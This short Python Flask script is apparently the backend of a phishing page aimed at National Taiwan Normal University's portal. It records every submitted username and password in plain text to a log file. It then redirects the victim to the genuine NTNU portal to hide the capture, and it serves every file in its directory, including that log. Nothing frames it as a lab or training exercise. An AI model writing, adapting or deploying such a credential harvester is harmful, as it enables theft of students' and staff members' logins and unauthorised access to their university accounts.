from flask import Flask, request, redirect, send_from_directory

app = Flask(__name__, static_folder='.')

@app.route('/', methods=['GET', 'POST'])
def index():
    if request.method == 'POST':
        # 獲取用戶輸入的帳號和密碼
        username = request.form.get('username', '')
        password = request.form.get('password', '')

        # 將用戶輸入記錄到伺服器端 (可以改為記錄到文件)
        with open('user_input_log.txt', 'a') as f:
            f.write(f"Username: {username}, Password: {password}\n")
        
        # 重定向到 Moodle 網站
        return redirect("https://iportal.ntnu.edu.tw/ntnu/")

    # 返回 index.html
    return send_from_directory('.', 'index.html')

@app.route('/<path:filename>')
def serve_static(filename):
    return send_from_directory('.', filename)

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=8080)

